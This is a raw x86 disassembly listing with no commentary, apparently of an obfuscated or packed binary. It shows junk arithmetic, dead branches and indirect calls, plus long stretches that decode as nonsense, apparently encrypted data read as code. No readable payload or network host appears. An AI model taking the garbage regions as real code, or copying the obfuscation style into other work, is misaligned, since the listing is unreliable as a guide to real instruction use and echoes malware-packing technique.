  420382:	sbb    DWORD PTR ds:0x428187,ecx
  420388:	mov    ecx,eax
  42038a:	mov    eax,DWORD PTR [ebp-0xc4]
  420390:	add    esi,0x7195
  420396:	imul   eax,eax,0x21b3
  42039c:	sbb    DWORD PTR ds:0x4282fb,ebx
  4203a2:	add    eax,DWORD PTR [ebp-0xe4]
  4203a8:	and    eax,0xd5c
  4203ad:	cmp    DWORD PTR ds:0x428377,0x0
  4203b4:	mov    DWORD PTR ds:0x42829f,ebx
  4203ba:	mov    esi,0x156a
  4203bf:	movzx  esi,WORD PTR ds:0x42819b
  4203c6:	jmp    0x420422
  4203cb:	mov    DWORD PTR ds:0x42825f,0x2dc
  4203d5:	mov    DWORD PTR ds:0x42825b,edi
  4203db:	cmp    DWORD PTR ds:0x428377,0x0
  4203e2:	jae    0x420410
  4203e8:	push   0x427fef
  4203ed:	call   DWORD PTR ds:0x428ec0
  4203f3:	movzx  esi,WORD PTR ds:0x428177
  4203fa:	add    DWORD PTR ds:0x4282f7,esi
  420400:	adc    DWORD PTR ds:0x428197,ebx
  420406:	add    DWORD PTR ds:0x428373,0x22a2
  420410:	and    esi,DWORD PTR ds:0x428373
  420416:	or     DWORD PTR ds:0x42836f,ecx
  42041c:	sbb    esi,DWORD PTR ds:0x4282f3
  420422:	sub    eax,0x2e81
  420427:	cmp    DWORD PTR ds:0x428273,0x0
  42042e:	mov    DWORD PTR ds:0x428373,0x5615
  420438:	mov    DWORD PTR ds:0x42816b,0x419b
  420442:	mov    DWORD PTR ds:0x42818f,0x389d
  42044c:	not    DWORD PTR ds:0x428263
  420452:	jmp    0x4204b6
  420457:	mov    esi,0x7b57
  42045c:	cmp    DWORD PTR ds:0x428273,0x0
  420463:	je     0x4204a0
  420469:	push   0x42823f
  42046e:	push   DWORD PTR [ebp-0x24]
  420471:	call   DWORD PTR ds:0x428ec4
  420477:	sub    DWORD PTR ds:0x4282f7,0x6950
  420481:	movzx  esi,WORD PTR ds:0x42826b
  420488:	xor    esi,DWORD PTR ds:0x42831b
  42048e:	mov    DWORD PTR ds:0x42826b,esi
  420494:	mov    esi,DWORD PTR ds:0x428253
  42049a:	or     DWORD PTR ds:0x4282ef,esi
  4204a0:	xor    DWORD PTR ds:0x42831f,ecx
  4204a6:	add    DWORD PTR ds:0x42831f,ebx
  4204ac:	or     DWORD PTR ds:0x428377,0x793c
  4204b6:	xor    edx,edx
  4204b8:	add    DWORD PTR ds:0x42818b,0xc98
  4204c2:	mov    esi,0x2f1dc
  4204c7:	div    esi
  4204c9:	xor    edx,edx
  4204cb:	xor    eax,0x56ef
  4204d0:	add    ecx,eax
  4204d2:	adc    DWORD PTR ds:0x42816f,ebx
  4204d8:	mov    DWORD PTR [ebp-0x90],ecx
  4204de:	sbb    DWORD PTR ds:0x4283a7,0x2859
  4204e8:	mov    DWORD PTR [ebp-0xe0],0x7a31
  4204f2:	mov    DWORD PTR [ebp-0x44],0x2514
  4204f9:	cmp    DWORD PTR ds:0x42818b,0x0
  420500:	mov    DWORD PTR ds:0x4282f3,0x6f69
  42050a:	mov    edx,0x2839
  42050f:	jmp    0x42057e
  420514:	movzx  ecx,WORD PTR ds:0x42828f
  42051b:	cmp    DWORD PTR ds:0x42818b,0x0
  420522:	jne    0x420555
  420528:	push   0x1336
  42052d:	push   DWORD PTR [ebp-0xc]
  420530:	push   0x75c6
  420535:	push   0x3ce6
  42053a:	push   DWORD PTR [ebp-0x1c]
  42053d:	call   DWORD PTR ds:0x428ec8
  420543:	mov    esi,DWORD PTR ds:0x42817b
  420549:	sbb    DWORD PTR ds:0x428197,esi
  42054f:	and    DWORD PTR ds:0x428293,edx
  420555:	sbb    DWORD PTR ds:0x428247,edx
  42055b:	mov    esi,DWORD PTR ds:0x42837f
  420561:	or     DWORD PTR ds:0x428383,esi
  420567:	mov    esi,DWORD PTR ds:0x4281a7
  42056d:	mov    edx,DWORD PTR ds:0x42833f
  420573:	sub    esi,edx
  420575:	and    esi,DWORD PTR [esi+edx*1]
  420578:	adc    DWORD PTR ds:0x42837f,edx
  42057e:	mov    DWORD PTR [ebp-0xdc],0x699c
  420588:	mov    DWORD PTR [ebp-0xd8],0x1
  420592:	adc    esi,eax
  420594:	mov    DWORD PTR [ebp-0x24],0x7901
  42059b:	cmp    DWORD PTR ds:0x428173,0x0
  4205a2:	not    esi
  4205a4:	mov    DWORD PTR ds:0x428397,0x3e17
  4205ae:	jmp    0x420635
  4205b3:	mov    DWORD PTR ds:0x428233,0x2222
  4205bd:	not    DWORD PTR ds:0x428243
  4205c3:	cmp    DWORD PTR ds:0x428173,0x0
  4205ca:	jge    0x42060e
  4205d0:	push   0x185b
  4205d5:	push   0x42839f
  4205da:	push   0x89e7
  4205df:	push   DWORD PTR [ebp-0x20]
  4205e2:	call   DWORD PTR ds:0x428e4c
  4205e8:	xor    edx,DWORD PTR ds:0x428247
  4205ee:	mov    ecx,DWORD PTR ds:0x42822f
  4205f4:	or     DWORD PTR ds:0x42815f,ecx
  4205fa:	mov    ecx,DWORD PTR ds:0x4282d3
  420600:	mov    ecx,DWORD PTR [ecx]
  420602:	and    DWORD PTR ds:0x42839b,ecx
  420608:	and    esi,0x3af9
  42060e:	and    ecx,0x78a0
  420614:	mov    edx,DWORD PTR ds:0x42827b
  42061a:	xor    DWORD PTR ds:0x428267,edx
  420620:	movzx  ecx,WORD PTR ds:0x428253
  420627:	and    ecx,DWORD PTR ds:0x42838b
  42062d:	mov    DWORD PTR ds:0x428253,ecx
  420633:	sub    ecx,edx
  420635:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  42063f:	xor    DWORD PTR ds:0x42839f,0x275e
  420649:	mov    DWORD PTR [ebp-0x78],0x37f2
  420650:	sbb    ecx,0x6514
  420656:	mov    DWORD PTR [ebp-0x10],0x62ba
  42065d:	jmp    0x4209b9
  420662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420663:	(bad)  
  420664:	mov    ?,ebx
  420666:	push   0x3a
  420668:	and    eax,0xe3891e9e
  42066d:	stos   BYTE PTR es:[edi],al
  42066e:	inc    esp
  42066f:	iret   
  420670:	fstp   TBYTE PTR [esi-0x54]
  420673:	sbb    eax,0x12a31816
  420678:	sbb    BYTE PTR [eax],bl
  42067a:	push   cs
  42067b:	push   es
  42067c:	and    eax,0x1c348ef9
  420681:	xchg   DWORD PTR [ebx],edi
  420683:	jmp    0x9e1d4056
  420688:	int3   
  420689:	repnz idiv DWORD PTR [ebp+0x513186ba]
  420690:	rcr    DWORD PTR [esi+0x70ba5319],1
  420696:	mov    bh,BYTE PTR [edx+0x70e65826]
  42069c:	push   esi
  42069d:	sub    dh,BYTE PTR [ebp+0x36b5a52f]
  4206a3:	outs   dx,DWORD PTR ds:[esi]
  4206a4:	repz inc ecx
  4206a6:	lods   eax,DWORD PTR ds:[esi]
  4206a7:	rcr    esp,1
  4206a9:	leave  
  4206aa:	and    ah,BYTE PTR [edi+eax*8+0x4c]
  4206ae:	rdmsr  
  4206b0:	mov    ah,0x1e
  4206b2:	scas   eax,DWORD PTR es:[edi]
  4206b3:	(bad)  
  4206b4:	js     0x420646
  4206b6:	jns    0x4206b8
  4206b8:	mov    esp,0x4ca5c89f
  4206bd:	arpl   cx,sp
  4206bf:	or     eax,0x5a8835a7
  4206c4:	call   0x9458:0xc2f1a42d
  4206cb:	mov    ds:0x46a1e9bb,al
  4206d0:	jb     0x42069c
  4206d2:	ror    ecx,0x24
  4206d5:	sbb    edi,esp
  4206d7:	test   al,0xc2
  4206d9:	pop    eax
  4206da:	or     esp,DWORD PTR [eax]
  4206dc:	xchg   BYTE PTR [ecx-0x14],dl
  4206df:	mov    dh,0x97
  4206e1:	push   edi
  4206e2:	lea    edi,[esi-0x327ef8dd]
  4206e8:	xchg   esp,eax
  4206e9:	jg     0x420676
  4206eb:	and    esp,DWORD PTR [eax+0x31]
  4206ee:	pop    ebx
  4206ef:	sahf   
  4206f0:	mov    WORD PTR [ebp-0x2512affd],gs
  4206f6:	xchg   esi,eax
  4206f7:	pop    edi
  4206f8:	outs   dx,DWORD PTR ds:[esi]
  4206f9:	enter  0x6323,0x32
  4206fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206fe:	dec    eax
  4206ff:	and    ecx,eax
  420701:	cmc    
  420702:	std    
  420703:	adc    DWORD PTR [edx+0x3d2fd099],0x50
  42070a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42070b:	add    al,0xc0
  42070d:	dec    edx
  42070e:	enter  0xefae,0x77
  420712:	mov    BYTE PTR [edi+0x50dc0038],ah
  420718:	mov    WORD PTR [eax],ds
  42071a:	sbb    eax,0x2d8a3499
  42071f:	pop    es
  420720:	test   BYTE PTR [esi],bh
  420722:	adc    DWORD PTR [ebx+0x36becfe1],edx
  420728:	mov    ch,0x88
  42072a:	add    DWORD PTR [ebx],esi
  42072c:	xchg   bl,al
  42072e:	add    al,0x57
  420730:	out    0x3c,al
  420732:	mov    esi,0xf34fd9c
  420737:	aam    0xdd
  420739:	mov    WORD PTR [ebx+edi*8],ss
  42073c:	and    dl,BYTE PTR ds:0x2ce18bfb
  420742:	nop
  420743:	xor    BYTE PTR [ebp-0x3f],bh
  420746:	(bad)  
  420747:	inc    eax
  420748:	adc    bh,ch
  42074a:	(bad)  
  42074b:	in     al,0x93
  42074d:	jecxz  0x420790
  42074f:	cmp    BYTE PTR [eax],bl
  420751:	in     eax,0x1d
  420753:	gs push 0xfffffffa
  420756:	jbe    0x420770
  420758:	addr16 popf 
  42075a:	jne    0x420737
  42075c:	add    DWORD PTR [ecx-0x55],0xffffffc2
  420760:	xchg   ecx,eax
  420761:	int3   
  420762:	push   edi
  420763:	inc    ecx
  420764:	stc    
  420765:	mov    ebx,DWORD PTR [ebp-0x67]
  420768:	cmp    ecx,DWORD PTR [edi-0x2be6db6d]
  42076e:	imul   BYTE PTR [eax+0x70]
  420771:	xchg   esi,eax
  420772:	sahf   
  420773:	jge    0x42072e
  420775:	add    al,0x6a
  420777:	data16 ja 0x4207b7
  42077a:	push   edi
  42077b:	mov    dh,0xe5
  42077d:	dec    eax
  42077e:	sub    DWORD PTR [esi],edx
  420780:	or     dl,BYTE PTR [ebx+0x34]
  420783:	nop
  420784:	lea    ebx,[eax+0x589a1701]
  42078a:	push   esi
  42078b:	mov    WORD PTR [edx],ds
  42078d:	out    dx,al
  42078e:	mov    bl,BYTE PTR [eax-0x54aee688]
  420794:	xchg   edi,eax
  420795:	loopne 0x4207e9
  420797:	jnp    0x42072f
  420799:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42079a:	iret   
  42079b:	jns    0x420794
  42079d:	push   esi
  42079e:	leave  
  42079f:	push   esi
  4207a0:	xchg   BYTE PTR [esi+0xc0c9e31],al
  4207a6:	lods   eax,DWORD PTR ds:[esi]
  4207a7:	jae    0x4207e4
  4207a9:	je     0x42073a
  4207ab:	rcl    edx,cl
  4207ad:	(bad)  
  4207ae:	int3   
  4207af:	lahf   
  4207b0:	pop    eax
  4207b1:	mov    ds:0xa4e6efaa,eax
  4207b6:	cmp    sp,WORD PTR [eax]
  4207b9:	in     eax,dx
  4207ba:	aaa    
  4207bb:	pop    ecx
  4207bc:	je     0x42082f
  4207be:	dec    ecx
  4207bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207c0:	push   0x3e10f60d
  4207c5:	inc    ecx
  4207c6:	push   ss
  4207c7:	icebp  
  4207c8:	jmp    0x597a:0x5665acff
  4207cf:	push   cs
  4207d0:	push   ebp
  4207d1:	jmp    0x8865:0x97b5d55c
  4207d8:	dec    esp
  4207d9:	sbb    DWORD PTR [esi+edx*1+0x19],esp
  4207dd:	stos   BYTE PTR es:[edi],al
  4207de:	shl    DWORD PTR ds:0x564c5dd,0xdc
  4207e5:	jp     0x420778
  4207e7:	es add eax,0xc685007e
  4207ed:	cwde   
  4207ee:	cwde   
  4207ef:	mov    eax,ds:0xaea2999c
  4207f4:	add    eax,0xa0250f43
  4207f9:	pop    ecx
  4207fa:	ja     0x4207d4
  4207fc:	add    eax,0xdf3e19dd
  420801:	inc    ebp
  420802:	mov    cl,0x3b
  420804:	jecxz  0x420820
  420806:	sub    dh,BYTE PTR [edx]
  420808:	cld    
  420809:	sub    DWORD PTR [ecx],0xa42299dc
  42080f:	adc    bh,BYTE PTR [ebx]
  420811:	jmp    DWORD PTR [ebx+0x5058821f]
  420817:	aad    0xa3
  420819:	iret   
  42081a:	out    dx,eax
  42081b:	add    BYTE PTR [ecx],bl
  42081d:	push   ebx
  42081e:	das    
  42081f:	push   ebp
  420820:	test   al,0x54
  420822:	cld    
  420823:	aam    0xa7
  420825:	call   0xad8e6310
  42082a:	mov    ds:0x1c568497,al
  42082f:	adc    al,0xe0
  420831:	fwait
  420832:	pusha  
  420833:	xor    ah,BYTE PTR [edi]
  420835:	fwait
  420836:	dec    ecx
  420837:	adc    eax,0x837992c7
  42083c:	mov    ah,0x13
  42083e:	pusha  
  42083f:	adc    al,0x68
  420841:	scas   eax,DWORD PTR es:[edi]
  420842:	pop    ebp
  420843:	mov    ebx,0x6376cd80
  420848:	stos   DWORD PTR es:[edi],eax
  420849:	dec    edi
  42084a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42084b:	mov    ds:0xeeb22b3,eax
  420850:	xlat   BYTE PTR ds:[ebx]
  420851:	sbb    DWORD PTR [ebx-0x1626c393],edi
  420857:	jmp    0x42085e
  420859:	mov    bl,0xd8
  42085b:	pop    edx
  42085c:	add    eax,0x57422764
  420861:	les    ebp,FWORD PTR [esi+0x1799cc06]
  420867:	push   ebx
  420868:	das    
  420869:	stos   DWORD PTR es:[edi],eax
  42086a:	add    al,0xb
  42086c:	pushf  
  42086d:	in     al,0x90
  42086f:	or     al,bl
  420871:	imul   ecx,ebx,0x74
  420874:	jne    0x420867
  420876:	or     al,0x92
  420878:	enter  0xd3b,0xbb
  42087c:	xchg   esi,eax
  42087d:	int3   
  42087e:	push   ds
  42087f:	cmp    esp,edi
  420881:	xor    cl,BYTE PTR [ebx+esi*8]
  420884:	(bad)  
  420886:	push   ds
  420887:	adc    al,0x27
  420889:	jp     0x42084c
  42088b:	popa   
  42088c:	pushf  
  42088d:	fild   DWORD PTR [ebp+0x7b5188cd]
  420893:	and    al,0x96
  420895:	sbb    DWORD PTR [ebx+0x72cfd55b],ecx
  42089b:	or     eax,0xa799d99f
  4208a0:	or     edi,DWORD PTR [ebp+0x5a4c0793]
  4208a6:	dec    dh
  4208a8:	in     eax,0x18
  4208aa:	icebp  
  4208ab:	gs jge 0x42091d
  4208ae:	and    esp,DWORD PTR fs:[esi]
  4208b1:	add    eax,0x13e78ac
  4208b6:	into   
  4208b7:	adc    DWORD PTR [esi-0x56c291cc],ecx
  4208bd:	jnp    0x420914
  4208bf:	push   cs
  4208c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208c1:	fs retf 
  4208c3:	faddp  st(2),st
  4208c5:	inc    esp
  4208c6:	and    eax,0x20861ba8
  4208cb:	push   es
  4208cc:	pop    edi
  4208cd:	mov    BYTE PTR [ebx-0x6b],dl
  4208d0:	push   edx
  4208d1:	std    
  4208d2:	inc    esp
  4208d3:	mov    esi,0x31420ecf
  4208d8:	popf   
  4208d9:	loop   0x42090f
  4208db:	and    eax,0xf82d12df
  4208e0:	xor    BYTE PTR [edi],ah
  4208e2:	mov    al,BYTE PTR [ecx+0x2415eb96]
  4208e8:	dec    cl
  4208ea:	mov    esi,0x80a47205
  4208ef:	pushf  
  4208f0:	retf   0x8c02
  4208f3:	sbb    DWORD PTR [edx+0xc],esi
  4208f6:	xchg   DWORD PTR [ebx+edi*4],ebx
  4208f9:	or     eax,DWORD PTR [edx+0x72]
  4208fc:	xchg   esp,eax
  4208fd:	xchg   ecx,eax
  4208fe:	add    BYTE PTR [ebx+ecx*1+0x5a],ah
  420902:	daa    
  420903:	or     BYTE PTR [ebx+0x7732851c],cl
  420909:	jbe    0x42094d
  42090b:	jecxz  0x420906
  42090d:	xchg   esp,eax
  42090e:	or     eax,ebx
  420910:	iret   
  420911:	repz repnz aaa 
  420914:	mov    dh,0xd8
  420916:	lahf   
  420917:	lods   eax,DWORD PTR ds:[esi]
  420918:	inc    ebx
  420919:	xchg   esp,eax
  42091a:	and    ebp,ebp
  42091c:	pop    edi
  42091d:	hlt    
  42091e:	daa    
  42091f:	ficomp WORD PTR [edx]
  420921:	repnz aad 0xe6
  420924:	cs sti 
  420926:	das    
  420927:	fldcw  WORD PTR [ecx-0x76]
  42092a:	adc    eax,0xb5c4a449
  42092f:	mov    ds:0x1471b054,al
  420934:	push   ds
  420935:	xchg   edx,eax
  420936:	sahf   
  420937:	inc    ebp
  420938:	xchg   DWORD PTR [ebx+0x67],edi
  42093b:	adc    eax,0xa227d369
  420940:	scas   eax,DWORD PTR es:[edi]
  420941:	out    0x33,eax
  420943:	xchg   edx,eax
  420944:	xchg   edi,eax
  420945:	stc    
  420946:	xor    ebx,edi
  420948:	scas   al,BYTE PTR es:[edi]
  420949:	fdivr  st(6),st
  42094b:	xor    eax,0xb41bb3e9
  420950:	in     al,0x9b
  420952:	scas   al,BYTE PTR es:[edi]
  420953:	sbb    bl,ah
  420955:	push   ecx
  420956:	in     al,0x80
  420958:	pop    esp
  420959:	hlt    
  42095a:	mov    cl,0x11
  42095c:	pusha  
  42095d:	xor    al,0xe4
  42095f:	xor    eax,ecx
  420961:	inc    eax
  420962:	pop    ebp
  420963:	in     al,0xe8
  420965:	jge    0x420919
  420967:	sub    edx,DWORD PTR [eax-0x65d34d7e]
  42096d:	pusha  
  42096e:	sahf   
  42096f:	jno    0x4209e8
  420971:	mov    DWORD PTR [ecx],eax
  420973:	loop   0x42097b
  420975:	mov    ch,0x42
  420977:	je     0x4209e3
  420979:	pop    es
  42097a:	enter  0x2f75,0xe1
  42097e:	rcr    BYTE PTR [esi],cl
  420980:	mov    ds:0xe4675a46,al
  420985:	add    esi,ebp
  420987:	push   0x20
  420989:	xor    ch,bh
  42098b:	enter  0xb233,0x98
  42098f:	mov    ah,0xfb
  420991:	push   ebx
  420993:	pusha  
  420994:	mov    al,ds:0x5ae6a219
  420999:	push   esi
  42099a:	(bad)  
  42099b:	sub    ebx,ebx
  42099d:	jmp    0x62aa:0x9bc80591
  4209a4:	out    dx,eax
  4209a5:	pushf  
  4209a6:	fwait
  4209a7:	sahf   
  4209a8:	popf   
  4209a9:	inc    ebp
  4209aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209ab:	push   esi
  4209ac:	imul   edx,edx,0x84b093b3
  4209b2:	scas   al,BYTE PTR es:[edi]
  4209b3:	sbb    eax,0xa309f46e
  4209b8:	inc    edi
  4209b9:	mov    DWORD PTR [ebp-0x94],0x561c
  4209c3:	mov    DWORD PTR [ebp-0x34],0x58bc
  4209ca:	mov    DWORD PTR [ebp-0x60],0x24c7
  4209d1:	xor    eax,DWORD PTR ds:0x428263
  4209d7:	mov    DWORD PTR [ebp-0x5c],0x7a45
  4209de:	xor    DWORD PTR ds:0x4282ff,0x80d
  4209e8:	mov    eax,DWORD PTR [ebp-0x34]
  4209eb:	cmp    DWORD PTR ds:0x428327,0x0
  4209f2:	movzx  esi,WORD PTR ds:0x42823f
  4209f9:	mov    ecx,0x4d8b
  4209fe:	jmp    0x420a54
  420a03:	mov    DWORD PTR ds:0x42816b,0x6139
  420a0d:	mov    DWORD PTR ds:0x4283a3,0x3849
  420a17:	cmp    DWORD PTR ds:0x428327,0x0
  420a1e:	jne    0x420a40
  420a24:	push   0x53aa
  420a29:	push   0x7054
  420a2e:	call   DWORD PTR ds:0x428e50
  420a34:	sub    DWORD PTR ds:0x4282fb,0xc6b
  420a3e:	inc    esi
  420a3f:	inc    edx
  420a40:	and    DWORD PTR ds:0x42822f,edi
  420a46:	and    edx,0x7a3f
  420a4c:	sbb    ecx,ecx
  420a4e:	and    esi,0x2474
  420a54:	mov    ecx,DWORD PTR [ebp-0x60]
  420a57:	adc    edx,DWORD PTR ds:0x42828b
  420a5d:	mov    edx,DWORD PTR [ebp-0x5c]
  420a60:	mov    esi,DWORD PTR ds:0x4282fb
  420a66:	sub    DWORD PTR ds:0x42830f,esi
  420a6c:	and    edx,0x160e
  420a72:	add    esi,DWORD PTR ds:0x42816f
  420a78:	sub    edx,ecx
  420a7a:	cmp    DWORD PTR ds:0x428283,0x0
  420a81:	mov    DWORD PTR ds:0x4282eb,ecx
  420a87:	mov    esi,DWORD PTR ds:0x428323
  420a8d:	jmp    0x420e58
  420a92:	mov    DWORD PTR ds:0x42826b,0x7aef
  420a9c:	cmp    DWORD PTR ds:0x428283,0x0
  420aa3:	je     0x420adc
  420aa9:	push   DWORD PTR [ebp-0x18]
  420aac:	push   0x4599
  420ab1:	push   DWORD PTR [ebp-0x14]
  420ab4:	push   DWORD PTR [ebp-0x10]
  420ab7:	call   DWORD PTR ds:0x428e54
  420abd:	mov    esi,DWORD PTR ds:0x42836b
  420ac3:	or     DWORD PTR ds:0x428293,esi
  420ac9:	xor    ecx,ecx
  420acb:	add    ecx,DWORD PTR ds:0x4281a3
  420ad1:	mov    esi,DWORD PTR ds:0x4283e7
  420ad7:	sub    ecx,esi
  420ad9:	or     ecx,DWORD PTR [ecx+esi*1]
  420adc:	mov    esi,DWORD PTR ds:0x42816b
  420ae2:	or     DWORD PTR ds:0x428293,esi
  420ae8:	add    ecx,0x4e9b
  420aee:	sbb    esi,ecx
  420af0:	sub    DWORD PTR ds:0x4282f3,ecx
  420af6:	or     esi,0x56f6
  420afc:	jmp    0x420e58
  420b01:	mov    bl,0xa9
  420b03:	lds    esp,FWORD PTR [edx-0x574d5d3d]
  420b09:	stos   BYTE PTR es:[edi],al
  420b0a:	xor    BYTE PTR [edi+0x7c],0xf6
  420b0e:	add    DWORD PTR [esi],edx
  420b10:	stos   BYTE PTR es:[edi],al
  420b11:	ss pop ss
  420b13:	push   ss
  420b14:	sbb    BYTE PTR [ebx+0x48181812],ah
  420b1a:	mov    esp,0xce4f2918
  420b1f:	jae    0x420b75
  420b21:	mov    bh,0xe0
  420b23:	mov    ds:0x70b74e4b,al
  420b28:	ficom  WORD PTR [ebx+0x4c]
  420b2b:	arpl   WORD PTR [ecx],sp
  420b2d:	aas    
  420b2e:	leave  
  420b2f:	repz inc ecx
  420b31:	bound  ebx,QWORD PTR [esi-0x72be3f6a]
  420b37:	add    DWORD PTR [edx],0xfffffffe
  420b3a:	nop
  420b3b:	jnp    0x420b78
  420b3d:	mov    DWORD PTR [ecx+0x5dc1cae5],edx
  420b43:	dec    ecx
  420b44:	add    ebx,DWORD PTR [ebx+0x454019ef]
  420b4a:	adc    ebp,DWORD PTR [eax]
  420b4c:	js     0x420b51
  420b4e:	inc    eax
  420b4f:	jne    0x420b7e
  420b51:	sub    BYTE PTR [bp+si+0x48],cl
  420b55:	or     BYTE PTR [eax],al
  420b57:	inc    eax
  420b58:	xor    al,0x79
  420b5a:	sbb    dh,BYTE PTR [edx]
  420b5c:	lahf   
  420b5d:	push   0xffffffe3
  420b5f:	lock cmp BYTE PTR ds:0xf688afa5,bh
  420b66:	and    al,0x37
  420b68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b69:	xchg   DWORD PTR [eax-0x38],esp
  420b6c:	jae    0x420b14
  420b6e:	xchg   esp,eax
  420b6f:	pop    ebp
  420b70:	mov    bl,0xc9
  420b72:	xor    edi,DWORD PTR [ebp-0x18047c7e]
  420b78:	and    eax,DWORD PTR [eax-0x625e16fb]
  420b7e:	imul   ebp,DWORD PTR [ebx],0x641f28cd
  420b84:	shl    BYTE PTR [ebx],0xfa
  420b87:	fs xchg ecx,eax
  420b89:	ror    ebx,1
  420b8b:	jae    0x420be4
  420b8d:	sub    DWORD PTR [edx+0x5c],ebp
  420b90:	test   al,0x74
  420b92:	mov    esp,0x152abcf2
  420b97:	or     eax,0x2b11ebeb
  420b9c:	mov    BYTE PTR [edx-0x9],al
  420b9f:	or     ebp,DWORD PTR [esp+edi*8]
  420ba2:	dec    esp
  420ba3:	popf   
  420ba4:	sbb    DWORD PTR [eax],0xde0b60aa
  420baa:	push   edx
  420bab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bac:	(bad)  
  420bad:	jp     0x420bdb
  420baf:	pusha  
  420bb0:	sbb    DWORD PTR [ecx-0x317f8b7],ecx
  420bb6:	xor    al,BYTE PTR [esi-0x2f30b39]
  420bbc:	(bad)  
  420bbd:	cmp    edx,DWORD PTR ds:0x93acba14
  420bc3:	mov    cl,0xda
  420bc5:	dec    edx
  420bc6:	add    eax,0x345e8f70
  420bcb:	pushf  
  420bcc:	es xchg edx,eax
  420bce:	fwait
  420bcf:	out    0xf7,al
  420bd1:	data16 aad 0x77
  420bd4:	imul   ebp,esi,0xdc37dbbe
  420bda:	jl     0x420ba8
  420bdc:	xchg   ebx,eax
  420bdd:	mov    BYTE PTR [edi],bh
  420bdf:	jne    0x420b9b
  420be1:	xchg   edx,eax
  420be2:	cld    
  420be3:	fidiv  DWORD PTR [ecx+eax*8]
  420be6:	rcr    BYTE PTR [esi],1
  420be8:	lods   al,BYTE PTR ds:[esi]
  420be9:	mov    dh,0xdf
  420beb:	dec    ebx
  420bec:	xchg   edi,eax
  420bed:	mov    ds:0xb4f64810,al
  420bf2:	mov    dh,dh
  420bf4:	repnz rol DWORD PTR [eax-0x5f],cl
  420bf8:	sbb    edx,DWORD PTR [esi-0x72af76f5]
  420bfe:	sbb    al,0x59
  420c00:	fmul   DWORD PTR [ecx-0x516ce364]
  420c06:	pop    eax
  420c07:	inc    ecx
  420c08:	xchg   edi,eax
  420c09:	pop    esi
  420c0a:	aas    
  420c0b:	aam    0xef
  420c0d:	loopne 0x420c8c
  420c0f:	xchg   edx,eax
  420c10:	push   ds
  420c11:	outs   dx,BYTE PTR ds:[esi]
  420c12:	cmp    DWORD PTR [edx+0x55],edi
  420c15:	lea    esp,[eax+0x5efef819]
  420c1b:	addr16 xchg esp,eax
  420c1d:	and    eax,0x45941a5b
  420c22:	xor    BYTE PTR ds:0x87ef7916,0x68
  420c29:	or     cl,BYTE PTR [ebx-0x3f]
  420c2c:	loope  0x420ca6
  420c2e:	xchg   ecx,eax
  420c2f:	mov    ds:0x203f866e,eax
  420c34:	imul   ebp,DWORD PTR [ecx],0x676a0fa5
  420c3a:	cmp    eax,DWORD PTR [esi-0x27]
  420c3d:	sub    al,0x14
  420c3f:	sbb    DWORD PTR [ebx],ebx
  420c41:	test   eax,0x954c95ad
  420c46:	retf   0x6af6
  420c49:	and    al,0x26
  420c4b:	push   edi
  420c4c:	pop    ebx
  420c4d:	adc    BYTE PTR [edx+0x9],0xaf
  420c51:	out    0x2b,al
  420c53:	push   eax
  420c54:	adc    eax,0x3f56ad1e
  420c59:	mov    esi,0x3cbd5dd7
  420c5e:	test   DWORD PTR [eax+ecx*2],esi
  420c61:	aas    
  420c62:	cwde   
  420c63:	and    al,0xc8
  420c65:	arpl   WORD PTR [ecx+0x608adced],di
  420c6b:	sbb    al,0x23
  420c6d:	icebp  
  420c6e:	xchg   ebp,eax
  420c6f:	jne    0x420bfe
  420c71:	and    bh,al
  420c73:	mov    ?,WORD PTR [edi-0xfd9b3e5]
  420c79:	lock xor al,0x67
  420c7c:	or     BYTE PTR ds:0xab333e33,cl
  420c82:	push   es
  420c83:	jmp    0x79b5ca68
  420c88:	(bad)  
  420c89:	mov    WORD PTR [esi+eax*8+0x5270dd9d],gs
  420c90:	mov    al,0xe
  420c92:	xchg   ah,dh
  420c94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c95:	add    DWORD PTR [ebp+0x37],edi
  420c98:	cwde   
  420c99:	cmp    ah,dh
  420c9b:	push   0x38
  420c9d:	aaa    
  420c9e:	stos   DWORD PTR es:[edi],eax
  420c9f:	outs   dx,BYTE PTR ds:[esi]
  420ca0:	or     ebx,DWORD PTR ds:0x9d039e84
  420ca6:	push   ecx
  420ca7:	push   eax
  420ca8:	(bad)  
  420ca9:	fidiv  WORD PTR [edx+0x41]
  420cac:	jp     0x420c79
  420cae:	fld    TBYTE PTR [ecx+0x43449bc9]
  420cb4:	push   edx
  420cb5:	dec    edx
  420cb6:	push   esi
  420cb7:	outs   dx,BYTE PTR ds:[esi]
  420cb8:	clc    
  420cb9:	je     0x420c51
  420cbb:	cwde   
  420cbc:	add    eax,DWORD PTR [ebx+eiz*2+0x3e1b0e33]
  420cc3:	and    al,0x22
  420cc5:	pop    ecx
  420cc6:	and    BYTE PTR [ebp+0x73],ah
  420cc9:	addr16 int3 
  420ccb:	cmp    dh,BYTE PTR [edi-0x3a]
  420cce:	push   esi
  420ccf:	adc    bl,BYTE PTR [eax]
  420cd1:	cwde   
  420cd2:	scas   eax,DWORD PTR es:[edi]
  420cd3:	add    eax,0xc86f2a34
  420cd8:	and    DWORD PTR [ebp-0x53b65f5c],ecx
  420cde:	je     0x420c6e
  420ce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ce1:	fsubr  st,st(5)
  420ce3:	fcomp  DWORD PTR [ecx]
  420ce5:	xchg   esp,eax
  420ce6:	dec    esi
  420ce7:	in     eax,dx
  420ce8:	pop    ebx
  420ce9:	in     eax,0x9f
  420ceb:	dec    esi
  420cec:	pop    edi
  420ced:	sbb    ebx,DWORD PTR [esi+0x25]
  420cf0:	add    ch,BYTE PTR [ebx]
  420cf2:	sbb    ebx,eax
  420cf4:	cmp    al,0x1b
  420cf6:	fcmovnbe st,st(6)
  420cf8:	inc    DWORD PTR [ebp-0x63]
  420cfb:	cmp    DWORD PTR [edx+esi*8],ebp
